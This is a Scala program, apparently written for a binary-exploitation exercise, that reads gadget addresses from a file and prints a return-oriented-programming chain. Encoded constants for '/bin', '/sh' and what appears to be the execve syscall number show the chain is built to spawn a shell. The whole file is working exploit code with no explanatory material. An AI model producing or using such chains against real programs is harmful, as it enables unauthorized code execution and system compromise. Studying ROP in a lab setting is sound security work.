package ROP
import scala.io.Source

object GadgetChainBuilder {

  def main(args: Array[String]): Unit = {
    val filename: String = args(0)
    // val outfile: String = args(1)

    val addresses = new Array[Long](8)
    var i: Int = 0
    for (line <- Source.fromFile(filename).getLines) {
      addresses(i) = java.lang.Long.parseLong(line.toUpperCase, 16)
      i += 1;
    }

    printf("%d ", addresses(1))
    printf("%d ", addresses(2))
    printf("%d ", 185273099)
    printf("%d ", addresses(0) + 28)
    printf("%d ", addresses(3))
    printf("%d ", addresses(4))
    printf("%d ", addresses(5))
    printf("%d ", addresses(0) + 56)
    printf("%d ", addresses(6))
    printf("%d ", addresses(0) + 48)
    printf("%d ", addresses(0) + 52)
    printf("%d ", addresses(7))
    printf("%d ", addresses(0) + 56)
    printf("%d ", 0)
    printf("%d ", 1852400175)
    printf("%d ", 6845231)
  }
}
